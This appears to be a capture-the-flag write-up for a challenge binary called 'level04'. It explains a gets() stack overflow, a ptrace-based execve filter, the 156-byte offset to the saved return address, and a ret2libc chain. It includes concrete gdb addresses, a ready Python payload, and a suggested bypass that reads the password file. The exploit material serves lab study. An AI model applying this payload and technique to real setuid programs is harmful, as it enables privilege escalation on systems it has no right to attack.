Level 4 - Source Analysis
==========================

Binary name: level04

Protection summary:
- 32-bit ELF, setuid challenge binary
- Stack canary: not present
- NX: disabled (stack is executable)
- PIE: disabled (binary text addresses stable)

Vulnerability type:
- Stack-based buffer overflow via gets()

Root cause:
- In child process, user input is read with gets() into a fixed-size local buffer:
	char user_buffer[128];
	gets(user_buffer);
- gets() has no length check, so input can overwrite saved EIP.

Main control-flow (important points):
1) main() forks.
2) Child:
	 - prctl(PR_SET_PDEATHSIG, SIGHUP)
	 - ptrace(PTRACE_TRACEME, ...)
	 - puts("Give me some shellcode, k")
	 - gets(user_buffer)
3) Parent:
	 - wait() loop + ptrace(PTRACE_PEEKUSER, child, 44, 0)
	 - if traced syscall == 11 (execve), prints "no exec() for you" and kills child.

Offset calculation (why 156):
- From disassembly, gets buffer starts at ebp-0x98.
- Saved return address is at ebp+0x4.
- Distance to overwrite EIP:
	(ebp+0x4) - (ebp-0x98) = 0x9c = 156 bytes.

Exploit strategy used here (ret2libc):
- Overwrite EIP with system() address.
- Set next return to exit().
- Pass "/bin/sh" pointer from libc as system() first argument.

Stack layout after overflow:
- [156 bytes padding]
- [EIP -> system]
- [RET for system -> exit]
- [arg1 for system -> "/bin/sh"]

Addresses collected in gdb session:
- system = 0xf7e6aed0
- exit   = 0xf7e5eb70
- "/bin/sh" = 0xf7f897ec

Payload used:
python -c 'import struct,sys; sys.stdout.write("A"*156 + struct.pack("<I",0xf7e6aed0) + struct.pack("<I",0xf7e5eb70) + struct.pack("<I",0xf7f897ec) + "\n")'

Notes:
- '; cat' was appended in pipeline to keep stdin open for interactive shell behavior.
- If execve filtering blocks this path on a specific run/environment, use ORW shellcode (open/read/write .pass) to avoid syscall 11.

